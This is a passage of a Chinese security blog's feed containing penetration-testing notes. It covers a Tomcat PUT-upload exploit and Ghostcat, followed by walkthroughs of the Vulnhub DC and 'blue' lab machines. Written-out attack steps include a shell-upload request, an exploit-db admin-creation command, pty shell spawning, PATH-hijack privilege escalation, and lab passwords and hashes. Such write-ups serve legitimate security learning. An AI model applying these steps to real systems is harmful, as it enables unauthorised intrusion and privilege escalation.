id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><p>conf&#x2F;web.xml文件配置了readonly&#x3D;false，导致可以写文件</p><p><img src="/../images/image-20230625214424587.png" alt="image-20230625214424587"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.174.129:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>693</span><br><span class="line"></span><br><span class="line"><span class="language-dockerfile"><span class="keyword">shell</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>需要进行绕过</strong></p><p>Windows：<br>1、利用&#x2F;shell.jsp::$DATA的方式绕过<br>2、&#x2F;shell.jsp%20，空格绕过<br>3、&#x2F;shell.jsp&#x2F; ， Tomcat在处理文件时会删除最后的&#x2F;<br>Linux：<br>1、&#x2F;shell.jsp&#x2F; ， Tomcat在处理文件时会删除最后的&#x2F;</p></blockquote><p><img src="/../images/2676572-20220223152639690-1145929483.png" alt="img"></p><p>返回201表示上传成功</p><h4 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h4><p>conf&#x2F;web.xml文件配置readonly值为True或注释该参数</p><h3 id="AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）"><a href="#AJP文件包含-x2F-读取–Ghostcat幽灵猫（CVE-2020-1938）" class="headerlink" title="AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）"></a>AJP文件包含&#x2F;读取–Ghostcat幽灵猫（CVE-2020-1938）</h3><h4 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h4><p><img src="/../images/image-20230617182333230.png" alt="image-20230617182333230"></p><h4 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h4><p><img src="/../images/image-20230913153055256.png" alt="image-20230913153055256"></p><h4 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h4><p><strong>python2运行</strong></p><p><strong>可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件</strong></p><p><img src="/../images/image-20230617184142564.png" alt="image-20230617184142564"></p><p><img src="/../images/image-20230617184129890.png" alt="image-20230617184129890"></p><h4 id="漏洞检测与修复"><a href="#漏洞检测与修复" class="headerlink" title="漏洞检测与修复"></a>漏洞检测与修复</h4><p><a href="https://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/#2-2-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析 | 回忆飘如雪 (gv7.me)</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DC系列</title>
      <link href="/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223133100570-1686283446321.png" alt="image-20230223133100570"></p><p><img src="/../images/image-20230223133203500-1686283446321.png" alt="image-20230223133203500"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><img src="/../images/image-20230223131655833-1686283446321.png" alt="image-20230223131655833"></p><h4 id="查看网站"><a href="#查看网站" class="headerlink" title="查看网站"></a>查看网站</h4><p><img src="/../images/image-20230223133357605-1686283446321.png" alt="image-20230223133357605"></p><p>只有注册，登录，找回密码功能（这里用sqlmap没有成功）</p><p>很容易知道其是Drupal系统。</p><h4 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h4><p><img src="/../images/image-20230223133730288-1686283446321.png" alt="image-20230223133730288"></p><p>这里优先使用日期较新，等级为优秀的exp（也可以通过收集到的系统版本寻找日期）</p><p><img src="/../images/image-20230223133945118-1686283446321.png" alt="image-20230223133945118"></p><p>发现成功了。</p><h4 id="获得shell后的信息收集"><a href="#获得shell后的信息收集" class="headerlink" title="获得shell后的信息收集"></a>获得shell后的信息收集</h4><p><img src="/../images/image-20230223134100934-1686283446322.png" alt="image-20230223134100934"></p><p>网上查找可知Drupal的配置文件在<code> /sites/default/settings.php</code>,读取后得到flag2和数据库配置信息</p><p><img src="/../images/1962254-20200713224317160-859515027-1686283446322.png" alt="img"></p><p>连接数据库，需要先将shell切换为交互式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223134424820-1686283446322.png" alt="image-20230223134424820"></p><p>连接后，查询用户表收集管理员账户信息。</p><p><img src="/../images/image-20230223130117676-1686283446322.png" alt="image-20230223130117676"></p><p>可以看到这里admin的密码是加密了的。这里有三种思路</p><ul><li><p>暴力破解</p><blockquote><p>使用john失败了。</p></blockquote><p><img src="/../images/image-20230223135625792-1686283446323.png" alt="image-20230223135625792"></p></li><li><p>修改密码</p><blockquote><p>需要找到对应的加密脚本。</p></blockquote><p><img src="/../images/image-20230223135430041-1686283446323.png" alt="image-20230223135430041"></p><p><img src="/../images/image-20230223130607081-1686283446323.png" alt="image-20230223130607081"></p><p><img src="/../images/image-20230223131033472-1686283446323.png" alt="image-20230223131033472"></p></li><li><p>增加一名用户（管理员权限）</p><p>使用<a href="https://blog.csdn.net/whatday/article/details/102806149">SearchSploit</a>查找是否有对应的脚本</p><p><img src="/../images/image-20230223142047059-1686283446323.png" alt="image-20230223142047059"></p><p><img src="/../images/image-20230223142453365-1686283446323.png" alt="image-20230223142453365"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2  /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223142640254-1686283446323.png" alt="image-20230223142640254"></p><p><img src="/../images/image-20230223142651974-1686283446323.png" alt="image-20230223142651974"></p></li></ul><h3 id="登录后"><a href="#登录后" class="headerlink" title="登录后"></a>登录后</h3><p><img src="/../images/image-20230223131339443-1686283446323.png" alt="image-20230223131339443"></p><p><img src="/../images/image-20230223131415615-1686283446323.png" alt="image-20230223131415615"></p><p><img src="/../images/image-20230223131557531-1686283446323.png" alt="image-20230223131557531"></p><p><img src="/../images/image-20230223131846299-1686283446324.png" alt="image-20230223131846299"></p><p>尝试提权</p><p><img src="/../images/image-20230223131936343-1686283446324.png" alt="image-20230223131936343"></p><p><img src="/../images/image-20230223131903800-1686283446324.png" alt="image-20230223131903800"></p><p><img src="/../images/image-20230223131922331-1686283446324.png" alt="image-20230223131922331"></p><p><img src="/../images/image-20230223132056437-1686283446324.png" alt="image-20230223132056437"></p><p><img src="/../images/image-20230223132116100-1686283446324.png" alt="image-20230223132116100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223132610089-1686283446324.png" alt="image-20230223132610089"></p><p>破解成功后登录flag4用户</p><p><img src="/../images/image-20230223132741851-1686283446324.png" alt="image-20230223132741851"></p><p><img src="/../images/image-20230223132857455-1686283446324.png" alt="image-20230223132857455"></p><p>仍然使用上面的find提权</p><p><img src="/../images/image-20230223132915683-1686283446324.png" alt="image-20230223132915683"></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><p><a href="https://cloud.tencent.com/developer/article/1801074">https://cloud.tencent.com/developer/article/1801074</a></p><ul><li>ip重定向，需要添加host记录</li><li>cewl密码字典生成，密码爆破</li><li>7744端口的ssh爆破</li><li>rbash限制</li><li>git提权</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p><a href="https://blog.csdn.net/bwt_D/article/details/121291921">https://blog.csdn.net/bwt_D/article/details/121291921</a></p><ul><li>信息收集：得到网站CMS，使用对应版本漏洞exp爆库</li><li>john密码哈希爆破</li><li>后台任意文件上传</li><li>内核提权</li></ul><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><ul><li>用户登录无防护爆破</li><li>rce</li><li>ssh爆破</li><li>信息收集：备份文件，邮件（泄露用户密码）</li><li>teehee提权</li></ul><p><img src="/../images/image-20230224161511140-1686283446324.png" alt="image-20230224161511140"></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p><a href="https://www.freebuf.com/sectool/259277.html">https://www.freebuf.com/sectool/259277.html</a></p><ul><li>日志包含getshell</li><li>screen提权</li></ul><p>端口扫描</p><img src="../../../typora img/image-20230224202703382.png" alt="image-20230224202703382" style="zoom: 80%;" /><p>通过contact提交后，页面返回的页脚不同判断出后端有include函数包含了页脚文件。</p><p><img src="/../images/image-20230224204544733-1686283446324.png" alt="image-20230224204544733"></p><p><img src="/../images/image-20230224204559624-1686283446325.png" alt="image-20230224204559624"></p><p>使用burp爆破参数</p><p><img src="/../images/image-20230224204633133-1686283446325.png" alt="image-20230224204633133"></p><img src="../../../typora img/image-20230224204657204.png" alt="image-20230224204657204" style="zoom:80%;" /><p>文件包含getshell</p><p>因为网站没有文件上传功能，所以可以考虑包含日志文件&#x2F;session文件，或者与phpinfo界面连用。</p><p>这里选择包含日志文件</p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><p><a href="https://blog.csdn.net/weixin_45996361/article/details/123431118">https://blog.csdn.net/weixin_45996361/article/details/123431118</a></p><ul><li>用户密码爆破（字典为DC2的）</li><li>wordpress插件activity monitor提供了ping命令，对用户输入无限制导致rce</li><li>邮件密码泄露</li><li>sudo提权</li><li>nmap提权</li></ul><p><img src="/../images/image-20230225172831079-1686283446325.png" alt="image-20230225172831079"></p><p><img src="/../images/image-20230225202530004-1686283446325.png" alt="image-20230225202530004"></p><p><img src="/../images/image-20230225202604851-1686283446325.png" alt="image-20230225202604851"></p><p><img src="/../images/image-20230225202617319-1686283446325.png" alt="image-20230225202617319"></p><p><img src="/../images/image-20230225202517080-1686283446325.png" alt="image-20230225202517080"></p><p><img src="/../images/image-20230225202502557-1686283446325.png" alt="image-20230225202502557"></p><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><ul><li><p>端口：22,80</p></li><li><p>信息收集：github源码泄露</p><p><img src="/../images/image-20230225211326780-1686283446325.png" alt="image-20230225211326780"></p><img src="../../../typora img/image-20230225211258444.png" alt="image-20230225211258444" style="zoom:80%;" /><p><img src="/../images/image-20230225211553018-1686283446325.png" alt="image-20230225211553018"></p><p>这个账户测试后可以连接ssh</p></li><li><p>ssh连接后信息收集</p><p>有邮件</p><p><img src="/../images/image-20230225211951236-1686283446325.png" alt="image-20230225211951236"></p><p><img src="/../images/image-20230225211719078-1686283446326.png" alt="image-20230225211719078"></p><p>发现都是以下信息，并且每隔一段时间都有<code>You have new mail</code>提示，可以猜测出这是一个定时脚本</p><p><img src="/../images/image-20230225211729539-1686283446326.png" alt="image-20230225211729539"></p><p><img src="/../images/image-20230225211814513-1686283446326.png" alt="image-20230225211814513"></p><p>​</p></li></ul><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p>drush是drupal的命令，可以修改admin密码 ，不知道为什么在网站目录下才可以</p><p>gpg是公钥加密算法，没找到公钥，所以无法解密，否则可以解密重新导入sql文件</p><p><code>mysql -udc7user -pMdR3xOgB7#dW Staff &lt; /home/dc7user/backups/website.sql;</code></p><ul><li><p>提权</p><p>​通过修改admin密码登录后台，可以编辑博客或者页面。那么直接选择编辑页面写入一个木马。但是需要先安装PHP模块。</p><p>​木马写入后，获得www-data用户权限</p><p>​<img src="/../images/image-20230225225209155-1686283446326.png" alt="image-20230225225209155"></p><p>从定时脚本所属的用户和用户组入手，用户组为www-data权限为rwx：说明www</p><p>-data用户可以对其进行读写执行，拥有者为root：说明其运行时的权限为root。所以我们向其写入反弹shell，等待其执行就可以获得root权限。</p></li></ul><h2 id="DC8"><a href="#DC8" class="headerlink" title="DC8"></a>DC8</h2><p><a href="https://blog.csdn.net/q90375412/article/details/127351747">https://blog.csdn.net/q90375412/article/details/127351747</a></p><ul><li>sql注入（sqlmap）</li><li>john破解密码</li><li>后台模板getshell</li><li>exim4提权</li></ul><h2 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h2><p><a href="https://blog.csdn.net/m0_65712192/article/details/129250059">https://blog.csdn.net/m0_65712192/article/details/129250059</a></p><p><img src="/../images/image-20230309113640488-1686283446326.png" alt="image-20230309113640488"></p><p>可以发现ssh服务是filtered的</p><p><img src="/../images/image-20230309115117489-1686283446326.png" alt="image-20230309115117489"></p><p><img src="/../images/image-20230309115144629-1686283446326.png" alt="image-20230309115144629"></p><p><img src="/../images/image-20230309121325288-1686283446326.png" alt="image-20230309121325288"></p><p><img src="/../images/image-20230309121309508-1686283446326.png" alt="image-20230309121309508"></p><p><img src="/../images/image-20230309121245679-1686283446327.png" alt="image-20230309121245679"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--blue系列</title>
      <link href="/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-blue%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><img src="../../../typora img/image-20230305123445338.png" alt="image-20230305123445338" style="zoom:80%;" /><p><img src="/../images/image-20230305130206056-1686283466992.png" alt="image-20230305130206056"></p><p><img src="/../images/image-20230305130221501-1686283466992.png" alt="image-20230305130221501"></p><p>secret.zip没有破解出来。</p><p>dirseach目录扫描结果</p><p><img src="/../images/image-20230305130651336-1686283466992.png" alt="image-20230305130651336"></p><p>访问robots.txt中的网址</p><p><img src="/../images/image-20230305130727097-1686283466992.png" alt="image-20230305130727097"></p><p>歌词连在一起MD5为ssh密码，没成功。</p><p>另一个网站为&#x2F;etc&#x2F;dripispowerful.html，猜测有文件包含，根据上面的目录扫描只有一个index.php，参数尝试压缩包里的focus  on “drip”。</p><p>尝试访问index.php?drip&#x3D;&#x2F;etc&#x2F;dripispowerful.html，获得密码和两个用户名</p><p><img src="/../images/image-20230305131636950-1686283466992.png" alt="image-20230305131636950"></p><p>ssh登录</p><p><img src="/../images/image-20230305132010055-1686283466992.png" alt="image-20230305132010055"></p><p>提权（不会，看wp的）</p><p><img src="/../images/image-20230305133355153-1686283466992.png" alt="image-20230305133355153"></p><p>polkit提权<a href="https://github.com/Almorabea/Polkit-exploit">https://github.com/Almorabea/Polkit-exploit</a></p><p><img src="/../images/image-20230305133346301-1686283466992.png" alt="image-20230305133346301"></p><p><img src="/../images/image-20230305133331628-1686283466992.png" alt="image-20230305133331628"></p><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ul><li>ftp匿名登录</li><li>wordpress用户爆破，后台getshell</li><li>ssh密钥登录</li><li>nmap提权</li></ul><p><img src="/../images/image-20230304120228644-1686283466993.png" alt="image-20230304120228644"></p><p><img src="/../images/image-20230304120308755-1686283466993.png" alt="image-20230304120308755"></p><p>ftp存在匿名登录，经过验证发现ftp上的secret.jpg无隐写。</p><p><img src="/../images/image-20230304120324693-1686283466993.png" alt="image-20230304120324693"></p><p><img src="/../images/image-20230304120358152-1686283466993.png" alt="image-20230304120358152"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230304121310981-1686283466993.png" alt="image-20230304121310981"></p><p>进行密码爆破</p><p><img src="/../images/image-20230304122015951-1686283466993.png" alt="image-20230304122015951"></p><p>访问后台时跳转，添加host记录</p><p><img src="/../images/image-20230304121229221-1686283466993.png" alt="image-20230304121229221"></p><p>进入后台</p><p>在主题的404文件中加入一句话木马，访问该404文件，传入反弹shell</p><p><img src="/../images/image-20230304125406319-1686283466993.png" alt="image-20230304125406319"></p><p><img src="/../images/image-20230304125413838-1686283466993.png" alt="image-20230304125413838"></p><p><img src="/../images/image-20230304125353482-1686283466993.png" alt="image-20230304125353482"></p><p>进入家目录看看</p><p><img src="/../images/image-20230304125605846-1686283466993.png" alt="image-20230304125605846"></p><p>无权限，尝试提权失败</p><p>但是还存在ssh密钥，我们可以将ssh私钥下载到本地，通过ssh登录到freddie用户</p><p>使用python在.ssh目录下开一个简易服务器供本地下载文件。</p><p><img src="/../images/image-20230304131800088-1686283466993.png" alt="image-20230304131800088"></p><p>本地下载下来后，需要将id_rsa改为只有400权限才可以使用</p><p><img src="/../images/image-20230304132002887-1686283466993.png" alt="image-20230304132002887"></p><p><img src="/../images/image-20230304132104344-1686283466993.png" alt="image-20230304132104344"></p><p><img src="/../images/image-20230304132257002-1686283466993.png" alt="image-20230304132257002"></p><p><img src="/../images/image-20230304132307798-1686283466993.png" alt="image-20230304132307798"></p><p><img src="/../images/image-20230304132242555-1686283466993.png" alt="image-20230304132242555"></p><p>读取&#x2F;root&#x2F;root.txt获得第二个flag·</p><p><img src="/../images/image-20230304132345766-1686283466993.png" alt="image-20230304132345766"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><ul><li>ssh日志包含getshell</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304141715650-1686283466994.png" alt="image-20230304141715650"></p><p><img src="/../images/image-20230304141957453-1686283466994.png" alt="image-20230304141957453"></p><p>几个网站都是ABAB。。</p><p>wp-admin目录只有一个readme</p><p><img src="/../images/image-20230304141834709-1686283466994.png" alt="image-20230304141834709"></p><p>恶作剧😡</p><p>回头看namp的默认脚本的扫描，可以看到robots.txt中禁止了一个&#x2F;eventadmins，访问</p><p><img src="/../images/image-20230304142524510-1686283466994.png" alt="image-20230304142524510"></p><p>再访问提示ctrl+a发现</p><p><img src="/../images/image-20230304142655946-1686283466994.png" alt="image-20230304142655946"></p><p><img src="/../images/image-20230304142745118-1686283466994.png" alt="image-20230304142745118"></p><p>再访问</p><p><img src="/../images/image-20230304142923226-1686283466994.png" alt="image-20230304142923226"></p><p>一开始想的是用九头蛇进行爆破，但是用户只知道root。</p><p>后面发现不行，想到日志的用途，尝试进行ssh日志包含getshell。</p><p>因为日志中会记录ssh连接的用户名</p><p><img src="/../images/image-20230304165054436-1686283466994.png" alt="image-20230304165054436"></p><p>所以</p><p><img src="/../images/image-20230304165131376-1686283466994.png" alt="image-20230304165131376"></p><p>反弹shell</p><p><img src="/../images/image-20230304165152817-1686283466994.png" alt="image-20230304165152817"></p><p><img src="/../images/image-20230304165204015-1686283466994.png" alt="image-20230304165204015"></p><p>这里和上一个靶机一样，存在另一个用户robertj，并且www-data无法提权</p><p>按照上一个的思路查看.ssh目录，发现为空</p><p><img src="/../images/image-20230304165345630-1686283466994.png" alt="image-20230304165345630"></p><p>选择直接生成ssh密钥</p><img src="../../../typora img/image-20230304175028256.png" alt="image-20230304175028256" style="zoom:80%;" /><p>查看ssh配置文件：只允许密钥验证方式连接，并且用来验证的公钥为authorized_keys</p><p><img src="/../images/image-20230304171108734-1686283466994.png" alt="image-20230304171108734"></p><p>所以需要将公钥id_rsa.pub改为authorized_keys</p><p>然后用python在靶机上开一个http服务器，kali使用wget命令下载私钥，并修改私钥权限，最后ssh登录</p><p><img src="/../images/image-20230304175249187-1686283466994.png" alt="image-20230304175249187"></p><p>提权</p><p><img src="/../images/image-20230304174502247-1686283466994.png" alt="image-20230304174502247"></p><p>一开始想用strings查看的，但是没有安装，那就直接用一下看看</p><p><img src="/../images/image-20230304174629368-1686283466994.png" alt="image-20230304174629368"></p><p>可以知道这个命令实质上是执行了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip address</span><br><span class="line">cat /etc/hosts</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>那么我们选一个进行构造即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod 777 uname </span><br><span class="line">export PATH=/home/robertj:$PATH</span><br></pre></td></tr></table></figure><p>然后执行getinfo即可</p><p><img src="/../images/image-20230304174854741-1686283466995.png" alt="image-20230304174854741"></p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><ul><li>misc获得人员信息</li><li>ftp爆破</li><li>ftp+sync服务，导致可以通过ftp服务器操作网站服务器目录</li><li>ssh密钥登录</li><li>命令劫持提权</li></ul><p><img src="/../images/image-20230304191909931-1686283466995.png" alt="image-20230304191909931"></p><p>网站注释解码，访问另一个网站，brainfuck解码，二维码扫描最后得到如下</p><p><img src="/../images/image-20230304204625662-1686283466995.png" alt="image-20230304204625662"></p><p>收集到了网站技术人员的名字，可以尝试爆破ftp和ssh服务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure><p>ssh无果</p><p>ftp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: luther   password: mypics</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230304210341290-1686283466995.png" alt="image-20230304210341290"></p><p><img src="/../images/image-20230304211248271-1686283466995.png" alt="image-20230304211248271"></p><p>发现了一个目录，目录名为hubert是收集到的一个用户，并且uid和gid为1001，证明其是第一个用户，所以该目录为hubert用户的家目录。</p><p>另一个文件使用get命令下载到本地后</p><p><img src="/../images/image-20230304212449213-1686283466995.png" alt="image-20230304212449213"></p><p>可以发现是一个同步完成的日志。</p><blockquote><p>所以根据这两个信息，我们可以知道服务器会同步这个ftp上的文件，就相当于我们可以操作hubert用户的家目录。</p></blockquote><p>我们使用put命令上传自己的公钥</p><p><img src="/../images/image-20230304212132365-1686283466995.png" alt="image-20230304212132365"></p><p>需要注意公钥名</p><p><img src="/../images/image-20230304212209119-1686283466995.png" alt="image-20230304212209119"></p><p>然后ssh连接</p><p><img src="/../images/image-20230304212235168-1686283466995.png" alt="image-20230304212235168"></p><p>看下家目录有啥</p><p><img src="/../images/image-20230304212842826-1686283466995.png" alt="image-20230304212842826"></p><p>读取这个root权限的py文件，我们可以知道这个网站被黑客frica攻击了，并且留下了后门，所以这也是为什么前面叫人来修复网站的原因🤣</p><p>这个黑客还告诉我们他留下了松散的权限😍</p><p><img src="/../images/image-20230304212825018-1686283466995.png" alt="image-20230304212825018"></p><p>让我康康</p><p><img src="/../images/image-20230304213424178-1686283466995.png" alt="image-20230304213424178"></p><p>这次有strings命令，查看getinfo</p><p><img src="/../images/image-20230304213618067-1686283466995.png" alt="image-20230304213618067"></p><p>跟上一个靶机一样</p><p><img src="/../images/image-20230304213721571-1686283466995.png" alt="image-20230304213721571"></p><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p><img src="/../images/image-20230305160546454-1686283466995.png" alt="image-20230305160546454"></p><p><img src="/../images/image-20230305163954224-1686283466995.png" alt="image-20230305163954224"></p><p>wpscan用户枚举</p><p><img src="/../images/image-20230305160724611-1686283466995.png" alt="image-20230305160724611"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abuzerkomurcu</span><br><span class="line">collins</span><br><span class="line">gill</span><br><span class="line">collins</span><br><span class="line">satanic</span><br></pre></td></tr></table></figure><p>密码字典生成</p><p><img src="/../images/image-20230305162409527-1686283466995.png" alt="image-20230305162409527"></p><blockquote><p>-m 6 是因为wordpress密码最少6个字符</p></blockquote><p>爆破密码</p><p><img src="/../images/image-20230305162556601-1686283466995.png" alt="image-20230305162556601"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill / interchangeable</span><br></pre></td></tr></table></figure><p>普通用户，后台只找到一张可以图片DB</p><p><img src="/../images/image-20230305164352862-1686283466996.png" alt="image-20230305164352862"></p><p>分析这张图片</p><p><img src="/../images/image-20230305164731337-1686283466996.png" alt="image-20230305164731337"></p><p><img src="/../images/image-20230305164827742-1686283466996.png" alt="image-20230305164827742"></p><p>得到ssh账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gill 59583hello</span><br></pre></td></tr></table></figure><p>登陆后发现</p><p><img src="/../images/image-20230305165100247-1686283466996.png" alt="image-20230305165100247"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lost+found目录无权限</span><br><span class="line"></span><br><span class="line">家目录下有一个kEYFILE</span><br></pre></td></tr></table></figure><p>通过搜索得到</p><p><img src="/../images/image-20230305165731867-1686283466996.png" alt="image-20230305165731867"></p><p><img src="/../images/image-20230305171048832-1686283466996.png" alt="image-20230305171048832"></p><p>可以使用john进行破解，机子GPU太垃圾了，直接从wp拿到密码</p><p>获得密码后，可以用KeePass软件<a href="https://sourceforge.net/projects/keepass/%E6%89%93%E5%BC%80%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E7%94%A8%E5%9C%A8%E7%BA%BF%E7%BD%91%E7%AB%99">https://sourceforge.net/projects/keepass/打开，也可以用在线网站</a></p><p><a href="https://app.keeweb.info/%E6%89%93%E5%BC%80%E3%80%82">https://app.keeweb.info/打开。</a></p><p>打开后发现6个空白的key</p><p><img src="/../images/image-20230305172848464-1686283466996.png" alt="image-20230305172848464"></p><p>不知道拿来干嘛的。。</p><p>继续信息收集，发现根目录下有一个keyfolder，可能就是要让上面的key放在这个keyfolder</p><p>而且使用pyps64监控进程发现有一个定时任务key.sh，每一分钟执行一次。</p><p><img src="/../images/image-20230305172941445-1686283466996.png" alt="image-20230305172941445"></p><p>经测试当只有一个文件fracturedocean时</p><p><img src="/../images/image-20230305174849955-1686283466996.png" alt="image-20230305174849955"></p><p><img src="/../images/image-20230305175028644-1686283466996.png" alt="image-20230305175028644"></p><p>定时脚本内容</p><p><img src="/../images/image-20230305175728426-1686283466996.png" alt="image-20230305175728426"></p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p><img src="/../images/image-20230307141431844-1686283466996.png" alt="image-20230307141431844"></p><p>只开放了80端口</p><p><img src="/../images/image-20230307141917191-1686283466996.png" alt="image-20230307141917191"></p><p>提示我们目录扫描要添加zip类型，说明网站目录应该存在zip文件</p><p>目录扫描</p><p>dirserach</p><p><img src="/../images/image-20230307142511029-1686283466996.png" alt="image-20230307142511029"></p><p>gobuster</p><p><img src="/../images/image-20230307142447064-1686283466996.png" alt="image-20230307142447064"></p><p>访问&#x2F;spammer下载得到spammer.zip</p><p>使用john爆破</p><p><img src="/../images/image-20230307142628410-1686283466997.png" alt="image-20230307142628410"></p><p>解压得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mayer:lionheart</span><br></pre></td></tr></table></figure><p>访问网站</p><p><img src="/../images/image-20230307141958670-1686283466997.png" alt="image-20230307141958670"></p><p>尝试登录解压得到的用户，成功登录</p><p><img src="/../images/image-20230307142917723-1686283466997.png" alt="image-20230307142917723"></p><p>逛了一圈发现，页面编辑，邮箱泄露，插件（无法加载作罢）。</p><ul><li><p>网站配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Textpattern version: 4.8.3 (596bca03a4b32004412499363cecec62)</span><br><span class="line">Last update: 2020-09-13 19:56:06</span><br><span class="line">Site URL: 192.168.2.35/textpattern</span><br><span class="line">Admin URL: 192.168.2.35/textpattern/textpattern</span><br><span class="line">Document root: /var/www</span><br><span class="line">$path_to_site: /var/www/textpattern</span><br><span class="line">Textpattern path: /var/www/textpattern/textpattern</span><br><span class="line">Article URL pattern: messy</span><br><span class="line">Production status: testing</span><br><span class="line">Temporary directory path: /tmp</span><br><span class="line">PHP version: 5.5.38-1~dotdeb+7.1</span><br><span class="line">GD Graphics Library: 